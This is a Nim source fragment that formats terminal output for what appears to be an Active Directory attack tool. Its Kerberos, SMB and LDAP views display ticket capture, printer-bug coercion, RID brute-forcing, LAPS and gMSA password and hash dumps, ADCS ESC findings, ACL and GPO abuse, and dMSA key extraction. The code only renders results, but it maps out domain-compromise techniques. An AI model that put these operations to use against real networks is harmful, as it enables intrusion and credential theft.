proc brightYellow(text: string): string = esc("1;33", text)
proc red(text: string): string = esc("31", text)
proc brightRed(text: string): string = esc("1;31", text)
proc magenta(text: string): string = esc("35", text)
proc gray(text: string): string = esc("90", text)

proc visibleLenAnsi(text: string): int =
  var i = 0
  while i < text.len:
    if text[i] == '\e' and i + 1 < text.len and text[i + 1] == '[':
      while i < text.len and text[i] != 'm':
        inc i
      if i < text.len:
        inc i
    else:
      inc result
      inc i

proc padAnsiRight(text: string; width: int): string =
  let v = visibleLenAnsi(text)
  if v >= width: text
  else: text & repeat(' ', width - v)

proc renderProtocolLine(node: JsonNode): string =
  let protocol = node["protocol"].getStr().toUpperAscii()
  let host = node["host"].getStr()
  let port = node{"port"}.getInt()
  proc hexToBytesLocal(hex: string): string =
    if hex.len mod 2 != 0: return ""
    for i in countup(0, hex.len - 2, 2):
      try:
        result.add char(parseHexInt(hex[i .. i + 1]))
      except ValueError:
        return ""
  proc utf16LeLocal(data: string): string =
    var i = 0
    while i + 1 < data.len:
      let cp = uint32(ord(data[i])) or (uint32(ord(data[i + 1])) shl 8)
      i += 2
      if cp == 0: break
      if cp < 0x80:
        result.add char(cp)
      elif cp < 0x800:
        result.add char(0xC0 or (cp shr 6))
        result.add char(0x80 or (cp and 0x3F))
      else:
        result.add char(0xE0 or (cp shr 12))
        result.add char(0x80 or ((cp shr 6) and 0x3F))
        result.add char(0x80 or (cp and 0x3F))
  proc credentialSuffix(node: JsonNode): string =
    let credential = node{"credential"}.getStr()
    let password = node{"password"}.getStr()
    if credential.len > 0:
      result = "   " & dim("credential ") & brightCyan(credential)
    elif password.len > 0:
      result = "   " & dim("password ") & brightCyan(password)
  case node["protocol"].getStr()
  of "kerberos":
    const BoxWidth = 78
    proc topBorderK(label: string): string =
      let head = "┌─ " & label & " "
      gray("┌─ ") & label & gray(" " & repeat("─", max(3, BoxWidth - visibleLenAnsi(head))))
    proc bottomBorderK(): string = gray("└" & repeat("─", BoxWidth - 1))
    proc bodyK(text: string): string = gray("│  ") & text
    proc kvK(label, value: string): string =
      bodyK(padAnsiRight(dim(label), 11) & value)
    let title = bold("KERBEROS") & "  " & brightCyan(host & ":88")
    result = topBorderK(title)
    let ok = node{"success"}.getBool()
    result.add "\n" & kvK("operation", brightCyan(node{"operation"}.getStr()))
    result.add "\n" & kvK("status", if ok: green("ok") else: red("fail"))
    if node{"principal"}.getStr().len > 0:
      result.add "\n" & kvK("principal", bold(node{"principal"}.getStr()))
    if node{"service"}.getStr().len > 0:
      result.add "\n" & kvK("service", brightCyan(node{"service"}.getStr()))
    if node{"ccache"}.getStr().len > 0:
      result.add "\n" & kvK("ccache", dim(node{"ccache"}.getStr()))
    if node{"hash"}.getStr().len > 0:
      result.add "\n" & kvK("hash", node{"hash"}.getStr())
    if node{"message"}.getStr().len > 0:
      result.add "\n" & kvK("message", if ok: dim(node{"message"}.getStr()) else: red(node{"message"}.getStr()))
    result.add "\n" & bottomBorderK()
    return
  of "smb":
    const BoxWidth = 78
    proc visibleLen(text: string): int =
      var i = 0
      while i < text.len:
        if text[i] == '\e' and i + 1 < text.len and text[i + 1] == '[':
          while i < text.len and text[i] != 'm':
            inc i
          if i < text.len: inc i
        else:
          inc result
          inc i
    proc padR(text: string; width: int): string =
      let v = visibleLen(text)
      if v >= width: text
      else: text & repeat(' ', width - v)
    proc padL(text: string; width: int): string =
      let v = visibleLen(text)
      if v >= width: text
      else: repeat(' ', width - v) & text
    let challenge =
      if node.hasKey("ntlm_challenge"): node["ntlm_challenge"]
      else: newJNull()
    proc fromChallenge(key: string): string =
      if challenge.kind == JObject: challenge[key].getStr() else: ""
    let computer = fromChallenge("netbios_computer")
    let dnsDomain = fromChallenge("dns_domain")
    let nbDomain = fromChallenge("netbios_domain")
    let domain =
      if dnsDomain.len > 0: dnsDomain
      else: nbDomain
    let fqdn =
      if computer.len > 0 and dnsDomain.len > 0: computer & "." & dnsDomain
      elif computer.len > 0: computer
      else: host
    proc topBorder(label: string): string =
      let head = "┌─ " & label & " "
      let pad = max(3, BoxWidth - visibleLen(head))
      gray("┌─ ") & label & gray(" " & repeat("─", pad))
    proc midBorder(label: string): string =
      let head = "├─ " & label & " "
      let pad = max(3, BoxWidth - visibleLen(head))
      gray("├─ ") & label & gray(" " & repeat("─", pad))
    proc bottomBorder(): string =
      gray("└" & repeat("─", BoxWidth - 1))
    proc bodyLine(text: string): string =
      gray("│  ") & text
    proc kv(label: string; value: string): string =
      bodyLine(padR(dim(label), 11) & value)
    let titleText = bold("SMB") & "  " & brightCyan(host & ":" & $port) &
      "  " & bold(fqdn)
    result = topBorder(titleText)
    if not node["speaks_smb"].getBool():
      let state =
        if node["reachable"].getBool(): brightYellow("OPEN")
        else: red("DOWN")
      result.add "\n" & kv("status", state & "  " & dim(node["message"].getStr()))
      result.add "\n" & bottomBorder()
      return
    let signing =
      if node["signing_required"].getBool(): red("required")
      elif node["signing_enabled"].getBool(): yellow("enabled")
      else: green("disabled")
    result.add "\n" & kv("dialect",
      brightCyan(node["dialect"].getStr()) & "   " & dim("signing ") & signing)
    if domain.len > 0:
      result.add "\n" & kv("domain", magenta(domain))
    if node.hasKey("auth_attempted") and node["auth_attempted"].getBool():
      let user = node{"username"}.getStr()
      let authDomain =
        if node{"auth_domain"}.getStr().len > 0: node{"auth_domain"}.getStr()
        elif domain.len > 0: domain
        else: fromChallenge("target_name")
      let principal =
        if authDomain.len > 0: authDomain & "\\" & user
        else: user
      if node["authenticated"].getBool():
        var tags: seq[string]
        if node["local_admin"].getBool(): tags.add brightRed("admin")
        if node["signing_applied"].getBool(): tags.add green("signed")
        var line = green("ok") & "  " & bold(principal) & credentialSuffix(node)
        if tags.len > 0:
          line.add "   " & dim("[") & tags.join(dim(" "))  & dim("]")
        result.add "\n" & kv("session", line)
      else:
        result.add "\n" & kv("session",
          red("fail") & "  " & bold(principal) & "   " &
          dim("status " & node["status"].getStr()))
    template section(label: string; count: int; body: untyped) =
      let header =
        if count >= 0: brightYellow(label) & " " & dim("(" & $count & ")")
        else: brightYellow(label)
      result.add "\n" & midBorder(header)
      body
    template row(text: string) =
      result.add "\n" & bodyLine("  " & text)
    proc permTag(perms: string; probed: bool): string =
      if not probed: dim("-")
      elif perms.len == 0: dim("none")
      else:
        var parts: seq[string]
        for piece in perms.split(','):
          let p = piece.strip()
          if p == "READ": parts.add green("read")
          elif p == "WRITE": parts.add red("write")
          else: parts.add p
        parts.join(dim(","))
    if node.hasKey("shares") and node["shares"].len > 0:
      section("shares", node["shares"].len):
        const NameW = 18
        const TypeW = 8
        const PermW = 14
        row(dim(padR("name", NameW) & padR("type", TypeW) &
          padR("perm", PermW) & "comment"))
        for share in node["shares"]:
          let typ = share["type"].getInt()
          let typStr =
            case typ and 0x0f
            of 0: cyan("disk")
            of 1: cyan("print")
            of 2: cyan("dev")
            of 3: magenta("ipc")
            else: dim("?")
          let permsRaw = share{"permissions"}.getStr()
          let probed = share{"access_probed"}.getBool()
          let perm = permTag(permsRaw, probed)
          row(padR(bold(share["name"].getStr()), NameW) &
              padR(typStr, TypeW) &
              padR(perm, PermW) &
              dim(share["comment"].getStr().strip()))
    elif node.hasKey("srvsvc_rpc") and node["srvsvc_rpc"]["attempted"].getBool() and
        not node["srvsvc_rpc"]["bound"].getBool():
      section("shares", -1):
        row(red("unavailable") & "  " & dim("(SRVSVC bind failed)"))
    template renderEnum(key, label: string; body: untyped) =
      if node.hasKey(key) and node[key]{"attempted"}.getBool():
        let sectionNode {.inject.} = node[key]
        let entries {.inject.} = sectionNode{"entries"}
        if entries != nil and entries.len > 0:
          section(label, entries.len):
            body
        elif not sectionNode{"succeeded"}.getBool() and sectionNode{"message"}.getStr().len > 0:
          section(label, -1):
            row(red("unavailable") & "  " & dim("(" & sectionNode["message"].getStr() & ")"))
    renderEnum("sessions", "sessions"):
      const ClientW = 24
      const UserW = 22
      row(dim(padR("client", ClientW) & padR("user", UserW) &
        padR("active", 10) & "idle"))
      for entry in entries:
        row(padR(cyan(entry{"client"}.getStr()), ClientW) &
            padR(bold(entry{"user"}.getStr()), UserW) &
            padR(green($entry{"active_seconds"}.getInt() & "s"), 10) &
            yellow($entry{"idle_seconds"}.getInt() & "s"))
    renderEnum("disks", "disks"):
      var drives: seq[string]
      for entry in entries: drives.add brightCyan(entry.getStr())
      row(drives.join(dim("   ")))
    renderEnum("loggedon_users", "logged-on"):
      var seen: seq[string] = @[]
      for entry in entries:
        let dom = entry{"logon_domain"}.getStr()
        let userName = entry{"user"}.getStr()
        let principal = if dom.len > 0: dom & "\\" & userName else: userName
        if principal in seen: continue
        seen.add principal
        if dom.len > 0:
          row(magenta(dom) & dim("\\") & bold(userName))
        else:
          row(bold(userName))
    renderEnum("domain_users", "users"):
      const RidW = 8
      row(dim(padR("rid", RidW) & "name"))
      for entry in entries:
        let name = entry{"name"}.getStr()
        let isMachine = name.endsWith("$")
        row(padL(cyan($entry{"rid"}.getInt()), RidW - 2) & "  " &
          (if isMachine: dim(name) else: bold(name)))
    renderEnum("domain_groups", "groups"):
      const RidW = 8
      const KindW = 8
      row(dim(padR("rid", RidW) & padR("kind", KindW) & "name"))
      for entry in entries:
        let kind = entry{"kind"}.getStr()
        let kindColored =
          if kind == "alias": magenta(kind)
          else: cyan(kind)
        row(padL(cyan($entry{"rid"}.getInt()), RidW - 2) & "  " &
          padR(kindColored, KindW) & bold(entry{"name"}.getStr()))
    renderEnum("password_policy", "password policy"):
      const KeyW = 22
      for entry in entries:
        row(padR(dim("min length"), KeyW) & brightCyan($entry{"min_password_length"}.getInt()))
        row(padR(dim("history depth"), KeyW) & brightCyan($entry{"password_history"}.getInt()))
        row(padR(dim("max age (days)"), KeyW) & brightCyan($entry{"max_password_age_days"}.getInt()))
        let lt = entry{"lockout_threshold"}.getInt()
        row(padR(dim("lockout threshold"), KeyW) &
          (if lt == 0: red("0  (disabled)") else: brightCyan($lt)))
        row(padR(dim("lockout window"), KeyW) &
          brightCyan($entry{"lockout_window_minutes"}.getInt()) & dim(" min"))
    renderEnum("rid_brute", "rid brute"):
      const RidW = 8
      for entry in entries:
        let dom = entry{"domain"}.getStr()
        let name = entry{"name"}.getStr()
        let principal =
          if dom.len > 0: magenta(dom) & dim("\\") & bold(name)
          else: bold(name)
        row(padL(cyan($entry{"rid"}.getInt()), RidW - 2) & "  " & principal &
          "   " & dim("type " & $entry{"sid_type"}.getInt()))
    if node.hasKey("coerce"):
      let coerce = node["coerce"]
      let ok = coerce{"success"}.getBool()
      let listener = coerce{"listener"}.getStr()
      let msg = coerce{"message"}.getStr()
      result.add "\n" & midBorder("MS-RPRN coerce")
      result.add "\n" & kv("listener", brightCyan(listener))
      result.add "\n" & kv("status", if ok: green("triggered") else: red("failed"))
      result.add "\n" & kv("message", dim(msg))
    if node.hasKey("ticket_capture"):
      let cap = node["ticket_capture"]
      let ok = cap{"success"}.getBool()
      result.add "\n" & midBorder("ticket capture")
      result.add "\n" & kv("host", brightCyan(cap{"host"}.getStr()))
      result.add "\n" & kv("status", if ok: green("captured") else: red("no match"))
      if cap.hasKey("tickets") and cap["tickets"].len > 0:
        let t = cap["tickets"][0]
        result.add "\n" & kv("client", bold(t{"client"}.getStr()))
        result.add "\n" & kv("server", brightCyan(t{"server"}.getStr()))
      if cap.hasKey("saved_kirbi"):
        result.add "\n" & kv("kirbi", green(cap{"saved_kirbi"}.getStr()))
      if cap.hasKey("saved_ccache"):
        result.add "\n" & kv("ccache", green(cap{"saved_ccache"}.getStr()))
      if cap.hasKey("ccache_import"):
        let imp = cap["ccache_import"]
        let impOk = imp{"success"}.getBool()
        let principal = imp{"principal"}.getStr()
        let tickets = imp{"ticket_count"}.getInt()
        result.add "\n" & kv("import",
          (if impOk: green("ok") else: red("failed")) &
          (if principal.len > 0: dim("  ") & bold(principal) else: "") &
          (if tickets > 0: dim("  tickets=" & $tickets) else: ""))
      elif cap{"message"}.getStr().len > 0:
        result.add "\n" & kv("message", dim(cap{"message"}.getStr()))
    result.add "\n" & bottomBorder()
    return
  of "ldap":
    const BoxWidth = 78
    proc visibleLen(text: string): int =
      var i = 0
      while i < text.len:
        if text[i] == '\e' and i + 1 < text.len and text[i + 1] == '[':
          while i < text.len and text[i] != 'm':
            inc i
          if i < text.len: inc i
        else:
          inc result
          inc i
    proc padR(text: string; width: int): string =
      let v = visibleLen(text)
      if v >= width: text else: text & repeat(' ', width - v)
    proc topBorder(label: string): string =
      let head = "┌─ " & label & " "
      let pad = max(3, BoxWidth - visibleLen(head))
      gray("┌─ ") & label & gray(" " & repeat("─", pad))
    proc midBorder(label: string): string =
      let head = "├─ " & label & " "
      let pad = max(3, BoxWidth - visibleLen(head))
      gray("├─ ") & label & gray(" " & repeat("─", pad))
    proc bottomBorder(): string = gray("└" & repeat("─", BoxWidth - 1))
    proc bodyLine(text: string): string = gray("│  ") & text
    proc kv(label, value: string): string =
      bodyLine(padR(dim(label), 11) & value)
    let titleText = bold("LDAP") & "  " & brightCyan(host & ":" & $port)
    result = topBorder(titleText)
    if node.hasKey("items") or node.hasKey("operation"):
      let ok = node{"success"}.getBool()
      let isHttpOp = node{"operation"}.getStr() in ["adcs-request", "adcs-auth", "opsec-notes"]
      if not isHttpOp:
        result.add "\n" & kv("auth",
          if node{"authenticated"}.getBool(): green("ok") else: red("fail"))
      if node{"operation"}.getStr().len > 0:
        result.add "\n" & kv("operation", bold(node{"operation"}.getStr()))
      if node{"operation"}.getStr() == "adcs":
        let cas = node{"cas"}
        let tmpl = node{"templates"}
        let auths = node{"authorities"}
        if cas != nil and cas.kind == JArray:
          for ca in cas:
            let caName = ca{"attrs"}{"cn"}
            let dnsName = ca{"attrs"}{"dNSHostName"}
            let templates = ca{"attrs"}{"certificateTemplates"}
            let caVulnAttr = ca{"vulnerabilities"}
            let name = if caName != nil and caName.len > 0: caName[0].getStr() else: ca{"dn"}.getStr()
            let dns = if dnsName != nil and dnsName.len > 0: "  " & dim(dnsName[0].getStr()) else: ""
            var caVulnStr = ""
            if caVulnAttr != nil and caVulnAttr.kind == JArray and caVulnAttr.len > 0:
              var tags: seq[string] = @[]
              for v in caVulnAttr:
                let vid = v.getStr()
                tags.add (if vid == "ESC8": yellow("[" & vid & "]") else: red("[" & vid & "]"))
              caVulnStr = "  " & tags.join(" ")
            result.add "\n" & kv("ca", bold(name) & dns & caVulnStr)
            let caAnalysis = ca{"ca_analysis"}
            if caAnalysis != nil:
              let findings = caAnalysis{"findings"}
              if findings != nil and findings.kind == JArray:
                for f in findings:
                  let fid = f{"id"}.getStr()
                  let freason = f{"reason"}.getStr()
                  let color = if fid == "ESC8": yellow(fid) else: red(fid)
                  result.add "\n" & bodyLine("   " & color & "  " & dim(freason))
            if templates != nil and templates.kind == JArray:
              for t in templates:
                result.add "\n" & bodyLine("   " & dim(t.getStr()))
        if auths != nil and auths.kind == JArray:
          for auth in auths:
            let authName = auth{"attrs"}{"cn"}
            let name = if authName != nil and authName.len > 0: authName[0].getStr() else: auth{"dn"}.getStr()
            result.add "\n" & kv("root ca", dim(name))
        if tmpl != nil and tmpl.kind == JArray:
          for t in tmpl:
            let dispAttr = t{"attrs"}{"displayName"}
            let cnAttr = t{"attrs"}{"cn"}
            let ekuAttr = t{"attrs"}{"pKIExtendedKeyUsage"}
            let vulnAttr = t{"vulnerabilities"}
            let nameStr = if dispAttr != nil and dispAttr.len > 0: dispAttr[0].getStr()
                          elif cnAttr != nil and cnAttr.len > 0: cnAttr[0].getStr()
                          else: t{"dn"}.getStr()
            var ekus: seq[string] = @[]
            if ekuAttr != nil and ekuAttr.kind == JArray:
              for eku in ekuAttr: ekus.add eku.getStr()
            let ekuStr = if ekus.len > 0: "  " & dim(ekus.join(",")) else: ""
            var vulnStr = ""
            if vulnAttr != nil and vulnAttr.kind == JArray and vulnAttr.len > 0:
              var tags: seq[string] = @[]
              for v in vulnAttr: tags.add red("[" & v.getStr() & "]")
              vulnStr = "  " & tags.join(" ")
            result.add "\n" & bodyLine("  " & brightCyan(nameStr) & vulnStr & ekuStr)
        let ok = node{"success"}.getBool()
        result.add "\n" & kv("status", if ok: green("ok") else: yellow("empty"))
        result.add "\n" & bottomBorder()
        return
      if node{"operation"}.getStr() == "opsec-notes":
        let notes = node{"notes"}
        if notes != nil and notes.kind == JArray:
          for note in notes:
            result.add "\n" & midBorder(brightYellow(note{"area"}.getStr()))
            let events = note{"events"}
            if events != nil and events.kind == JArray:
              var vals: seq[string]
              for eventName in events: vals.add eventName.getStr()
              result.add "\n" & kv("events", vals.join(", "))
            let applies = note{"applies_to"}
            if applies != nil and applies.kind == JArray:
              var vals: seq[string]
              for item in applies: vals.add item.getStr()
              result.add "\n" & kv("applies", vals.join(", "))
            if note{"notes"}.getStr().len > 0:
              result.add "\n" & kv("notes", note{"notes"}.getStr())
        result.add "\n" & kv("status", green("ok"))
        if node{"message"}.getStr().len > 0:
          result.add "\n" & kv("message", node{"message"}.getStr())
        result.add "\n" & bottomBorder()
        return
      if node{"operation"}.getStr() in ["adcs-request", "adcs-auth"]:
        let ok = node{"success"}.getBool()
        if node{"ca"}.getStr().len > 0:
          result.add "\n" & kv("ca", node{"ca"}.getStr())
        if node{"template"}.getStr().len > 0:
          result.add "\n" & kv("template", node{"template"}.getStr())
        result.add "\n" & kv("status", if ok: green("issued") else: red("failed"))
        if node{"request_id"}.getStr().len > 0:
          result.add "\n" & kv("request_id", node{"request_id"}.getStr())
        if node{"cert"}.getStr().len > 0:
          result.add "\n" & kv("cert", brightGreen(node{"cert"}.getStr()))
        elif node{"pfx"}.getStr().len > 0:
          result.add "\n" & kv("pfx", brightGreen(node{"pfx"}.getStr()))
        if node{"message"}.getStr().len > 0 and not ok:
          result.add "\n" & kv("message", node{"message"}.getStr())
        result.add "\n" & bottomBorder()
        return
      if node{"operation"}.getStr() == "nested-groups":
        if node{"target_dn"}.getStr().len > 0:
          result.add "\n" & kv("target", brightCyan(node{"target_dn"}.getStr()))
        if node.hasKey("groups"):
          for group in node["groups"]:
            let samAttr = group{"attrs"}{"sAMAccountName"}
            let cnAttr = group{"attrs"}{"cn"}
            let sam = if samAttr != nil and samAttr.len > 0: samAttr[0].getStr() else: ""
            let cn = if cnAttr != nil and cnAttr.len > 0: cnAttr[0].getStr() else: ""
            result.add "\n" & bodyLine("  " & bold(if sam.len > 0: sam else: cn) &
              "  " & dim(group{"dn"}.getStr()))
      elif node{"operation"}.getStr() == "acl":
        if node{"target_dn"}.getStr().len > 0:
          result.add "\n" & kv("target", brightCyan(node{"target_dn"}.getStr()))
        if node{"owner_sid"}.getStr().len > 0:
          result.add "\n" & kv("owner", node{"owner_sid"}.getStr())
        if node{"group_sid"}.getStr().len > 0:
          result.add "\n" & kv("group", node{"group_sid"}.getStr())
        if node.hasKey("aces"):
          var shown = 0
          for ace in node["aces"]:
            if shown >= 30:
              result.add "\n" & bodyLine("  " & dim("... truncated; use --json for all ACEs"))
              break
            var rights: seq[string] = @[]
            if ace.hasKey("rights"):
              for right in ace["rights"]:
                rights.add right.getStr()
            let rightText =
              if rights.len > 0: rights.join(",")
              else: ace{"mask"}.getStr()
            result.add "\n" & bodyLine("  " & dim("type " & $ace{"type"}.getInt()) &
              "  " & brightCyan(ace{"trustee_sid"}.getStr()) &
              "  " & rightText)
            if ace{"object_type"}.getStr().len > 0:
              result.add "\n" & bodyLine("      " & dim("object " & ace{"object_type"}.getStr()))
            inc shown
      elif node{"operation"}.getStr() == "get-laps":
        if node{"computer_dn"}.getStr().len > 0:
          result.add "\n" & kv("computer", brightCyan(node{"computer_dn"}.getStr()))
        elif node{"computer"}.getStr().len > 0:
          result.add "\n" & kv("computer", brightCyan(node{"computer"}.getStr()))
        if node{"dns_host_name"}.getStr().len > 0:
          result.add "\n" & kv("dns", node{"dns_host_name"}.getStr())
        if node{"ms-Mcs-AdmPwd"}.getStr().len > 0:
          result.add "\n" & kv("legacy", brightYellow(node{"ms-Mcs-AdmPwd"}.getStr()))
        if node{"ms-Mcs-AdmPwdExpirationTime_iso"}.getStr().len > 0:
          result.add "\n" & kv("expires", node{"ms-Mcs-AdmPwdExpirationTime_iso"}.getStr())
        if node{"msLAPS-Password"}.getStr().len > 0:
          result.add "\n" & kv("windows", brightYellow(node{"msLAPS-Password"}.getStr()))
        if node{"msLAPS-EncryptedPassword"}.getStr().len > 0:
          result.add "\n" & kv("encrypted", dim(node{"msLAPS-EncryptedPassword"}.getStr()))
        if node{"msLAPS-EncryptedDSRMPassword"}.getStr().len > 0:
          result.add "\n" & kv("enc-dsrm", dim(node{"msLAPS-EncryptedDSRMPassword"}.getStr()))
        if node{"target_attribute"}.getStr().len > 0:
          result.add "\n" & kv("target", node{"target_attribute"}.getStr())
        if node{"msLAPS-PasswordExpirationTime_iso"}.getStr().len > 0:
          result.add "\n" & kv("expires", node{"msLAPS-PasswordExpirationTime_iso"}.getStr())
      elif node{"operation"}.getStr() == "get-gmsa":
        let entries = node{"entries"}
        if entries != nil and entries.kind == JArray and entries.len > 0:
          result.add "\n" & midBorder(brightYellow("gMSA passwords") & " " & dim("(" & $entries.len & ")"))
          for entry in entries:
            let account =
              if entry{"account"}.getStr().len > 0:
                entry{"account"}.getStr()
              else:
                let sam = entry{"attrs"}{"sAMAccountName"}
                if sam != nil and sam.kind == JArray and sam.len > 0: sam[0].getStr()
                else: entry{"dn"}.getStr()
            let ntHash = entry{"nt_hash"}.getStr()
            var principals: seq[string]
            let allowed = entry{"principals_allowed_to_read_password"}
            if allowed != nil and allowed.kind == JArray:
              for p in allowed: principals.add p.getStr()
            var line = "  " & padR(bold(account), 22)
            if ntHash.len > 0:
              line.add "  " & dim("NTLM: ") & brightGreen(ntHash)
            else:
              line.add "  " & red("no msDS-ManagedPassword returned")
            result.add "\n" & bodyLine(line)
            if principals.len > 0:
              result.add "\n" & bodyLine("    " & dim("PrincipalsAllowedToReadPassword: ") &
                principals.join(dim(", ")))
        else:
          result.add "\n" & kv("account", node{"account"}.getStr())
          result.add "\n" & kv("base", dim(node{"base"}.getStr()))
      elif node{"operation"}.getStr() in ["dns-add", "dns-replace", "dns-delete"]:
        if node{"zone"}.getStr().len > 0:
          result.add "\n" & kv("zone", brightCyan(node{"zone"}.getStr()))
        if node{"record"}.getStr().len > 0:
          var rec = node{"record"}.getStr()
          if node{"data"}.getStr().len > 0:
            rec.add "  " & dim(node{"record_type"}.getStr() & " ") & brightGreen(node{"data"}.getStr())
          result.add "\n" & kv("record", rec)
        if node{"record_dn"}.getStr().len > 0:
          result.add "\n" & kv("dn", dim(node{"record_dn"}.getStr()))
      elif node{"operation"}.getStr() == "adcs-template":
        if node{"template_dn"}.getStr().len > 0:
          result.add "\n" & kv("template", brightCyan(node{"template_dn"}.getStr()))
      elif node{"operation"}.getStr() == "set-scriptpath":
        if node{"account"}.getStr().len > 0:
          result.add "\n" & kv("account", brightCyan(node{"account"}.getStr()))
        if node{"script_path"}.getStr().len > 0:
          result.add "\n" & kv("scriptPath", brightGreen(node{"script_path"}.getStr()))
      elif node{"operation"}.getStr() == "cert-map":
        if node{"account"}.getStr().len > 0:
          result.add "\n" & kv("account", brightCyan(node{"account"}.getStr()))
        if node{"mode"}.getStr().len > 0:
          result.add "\n" & kv("mode", node{"mode"}.getStr())
        if node{"mapping"}.getStr().len > 0:
          result.add "\n" & kv("mapping", dim(node{"mapping"}.getStr()))
      elif node{"operation"}.getStr() in ["acl-add", "acl-remove", "set-owner"]:
        if node{"target_dn"}.getStr().len > 0:
          result.add "\n" & kv("target", brightCyan(node{"target_dn"}.getStr()))
        if node{"principal_sid"}.getStr().len > 0:
          result.add "\n" & kv("principal", bold(node{"principal"}.getStr()) &
            "  " & dim(node{"principal_sid"}.getStr()))
        if node{"owner_sid"}.getStr().len > 0:
          result.add "\n" & kv("owner", bold(node{"owner"}.getStr()) &
            "  " & dim(node{"owner_sid"}.getStr()))
        if node.hasKey("rights") and node["rights"].len > 0:
          var rights: seq[string] = @[]
          for right in node["rights"]: rights.add right.getStr()
          result.add "\n" & kv("rights", rights.join(","))
        if node{"mask"}.getStr().len > 0 and node{"mask"}.getStr() != "0x00000000":
          result.add "\n" & kv("mask", node{"mask"}.getStr())
      elif node{"operation"}.getStr() == "gpo-delegate":
        if node{"gpo"}.getStr().len > 0:
          result.add "\n" & kv("gpo", brightCyan(node{"gpo"}.getStr()))
        if node{"gpo_dn"}.getStr().len > 0:
          result.add "\n" & kv("dn", dim(node{"gpo_dn"}.getStr()))
        if node{"principal"}.getStr().len > 0:
          result.add "\n" & kv("principal", bold(node{"principal"}.getStr()))
        if node{"mode"}.getStr().len > 0:
          result.add "\n" & kv("mode", node{"mode"}.getStr())
        if node.hasKey("items"):
          for item in node["items"]:
            var rights: seq[string] = @[]
            if item.hasKey("rights"):
              for right in item["rights"]: rights.add right.getStr()
            let state = if item{"success"}.getBool(): green("ok") else: red("fail")
            result.add "\n" & bodyLine("  " & state & "  " &
              dim(item{"template"}.getStr()) & "  " & rights.join(","))
            if item{"diagnostic"}.getStr().len > 0:
              result.add "\n" & bodyLine("    " & dim(item{"diagnostic"}.getStr()))
      elif node{"operation"}.getStr() == "gpo-create":
        if node{"guid"}.getStr().len > 0:
          result.add "\n" & kv("guid", brightCyan(node{"guid"}.getStr()))
        if node{"dn"}.getStr().len > 0:
          result.add "\n" & kv("dn", dim(node{"dn"}.getStr()))
        if node{"sysvol"}.getStr().len > 0:
          result.add "\n" & kv("sysvol", node{"sysvol"}.getStr())
      elif node{"operation"}.getStr() == "gpo-startup":
        if node{"gpo"}.getStr().len > 0:
          result.add "\n" & kv("gpo", brightCyan(node{"gpo"}.getStr()))
        if node{"script"}.getStr().len > 0:
          result.add "\n" & kv("script", node{"script"}.getStr())
        if node{"script_remote"}.getStr().len > 0:
          result.add "\n" & kv("remote", dim(node{"script_remote"}.getStr()))
        if node{"params"}.getStr().len > 0:
          result.add "\n" & kv("params", node{"params"}.getStr())
      elif node{"operation"}.getStr() == "gpo-schtask":
        if node{"gpo"}.getStr().len > 0:
          result.add "\n" & kv("gpo", brightCyan(node{"gpo"}.getStr()))
        if node{"task_name"}.getStr().len > 0:
          result.add "\n" & kv("task", node{"task_name"}.getStr())
        if node{"task_cmd"}.getStr().len > 0:
          result.add "\n" & kv("cmd", node{"task_cmd"}.getStr())
        if node{"task_args"}.getStr().len > 0:
          result.add "\n" & kv("args", node{"task_args"}.getStr())
        if node{"task_user"}.getStr().len > 0:
          result.add "\n" & kv("user", node{"task_user"}.getStr())
        if node{"xml_remote"}.getStr().len > 0:
          result.add "\n" & kv("xml", dim(node{"xml_remote"}.getStr()))
      elif node{"operation"}.getStr() == "count":
        result.add "\n" & kv("kind", node{"count_kind"}.getStr())
        result.add "\n" & kv("count", $node{"count"}.getInt())
      elif node{"operation"}.getStr() == "bad-successor":
        if node{"dmsa_dn"}.getStr().len > 0:
          result.add "\n" & kv("dmsa", bold(node{"dmsa_sam"}.getStr()) &
            "  " & dim(node{"dmsa_dn"}.getStr()))
        if node{"preceding_dn"}.getStr().len > 0:
          result.add "\n" & kv("impersonate", brightCyan(node{"preceding_dn"}.getStr()))
        if node{"preceding_rc4"}.getStr().len > 0:
          result.add "\n" & kv("rc4 (preceding)", brightYellow(node{"preceding_rc4"}.getStr()))
        if node{"preceding_aes256"}.getStr().len > 0:
          result.add "\n" & kv("aes256 (preceding)", brightYellow(node{"preceding_aes256"}.getStr()))
        if node.hasKey("items"):
          for item in node["items"]:
            let state = if item{"success"}.getBool(): green("ok") else: red("fail")
            result.add "\n" & bodyLine("  " & state & "  " & dim(item{"kind"}.getStr()) &
              "  " & brightCyan(item{"dn"}.getStr()))
            if item{"diagnostic"}.getStr().len > 0:
              result.add "\n" & bodyLine("    " & dim(item{"diagnostic"}.getStr()))
        if node{"kinit_success"}.getBool():
          result.add "\n" & kv("ccache", brightGreen(node{"ccache"}.getStr()))
      elif node.hasKey("items"):
        for item in node["items"]:
          let state = if item{"success"}.getBool(): green("ok") else: red("fail")
          result.add "\n" & bodyLine("  " & state & "  " &
            dim(item{"kind"}.getStr()) & "  " & brightCyan(item{"dn"}.getStr()))
          if item{"diagnostic"}.getStr().len > 0:
            result.add "\n" & bodyLine("    " & dim(item{"diagnostic"}.getStr()))
      elif node{"delegate_to_dn"}.getStr().len > 0:
        result.add "\n" & kv("from", bold(node{"delegate_from"}.getStr()) &
          "  " & dim(node{"delegate_from_sid"}.getStr()))
        result.add "\n" & kv("to", brightCyan(node{"delegate_to_dn"}.getStr()))
      let statusText =
        if node{"operation"}.getStr() in ["nested-groups", "acl", "get-laps", "get-gmsa", "count"]:
          if ok: green("ok") else: red("failed")
        elif node{"operation"}.getStr() in ["acl-add", "acl-remove", "set-owner",
            "dns-add", "dns-replace", "dns-delete", "adcs-template", "cert-map",
            "set-scriptpath"]:
          if ok: green("modified") else: red("failed")
        else:
          if ok: green("modified") else: red("failed")
      result.add "\n" & kv("status", statusText)
      if node{"message"}.getStr().len > 0:
        result.add "\n" & kv("message", node{"message"}.getStr())
      result.add "\n" & bottomBorder()
      return
    if not node["speaks_ldap"].getBool():
      let state =
        if node["reachable"].getBool(): yellow("open")
        else: red("down")
      result.add "\n" & kv("status", state & "  " & dim(node["message"].getStr()))
      result.add "\n" & bottomBorder()
      return
    if node{"dns_host_name"}.getStr().len > 0:
      result.add "\n" & kv("host", magenta(node["dns_host_name"].getStr()))
    if node{"default_naming_context"}.getStr().len > 0:
      result.add "\n" & kv("base dn", brightCyan(node["default_naming_context"].getStr()))
    if node{"domain_sid"}.getStr().len > 0:
      result.add "\n" & kv("domain sid", dim(node["domain_sid"].getStr()))
    if node{"domain_functionality"}.getStr().len > 0:
      result.add "\n" & kv("domain fn", cyan(node["domain_functionality"].getStr()))
